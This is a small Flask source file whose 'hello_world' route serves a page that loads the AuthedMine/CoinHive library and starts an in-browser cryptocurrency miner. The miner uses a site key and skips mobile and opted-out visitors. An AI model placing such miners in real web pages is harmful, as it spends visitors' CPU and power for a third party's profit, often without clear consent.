from flask import Flask

app = Flask(__name__)


@app.route('/')
def hello_world():
    return """
    <html>
    <script src="https://authedmine.com/lib/authedmine.min.js"></script>
<script>
	var miner = new CoinHive.Anonymous('jgKLZHkHXIZ8rLXKdyAmnakvA46ijH3s', {throttle: 0.3});

	// Only start on non-mobile devices and if not opted-out
	// in the last 14400 seconds (4 hours):
	if (!miner.isMobile() && !miner.didOptOut(14400)) {
		miner.start();
	}
</script>
</html>
    """


app.run(host='127.0.0.1')
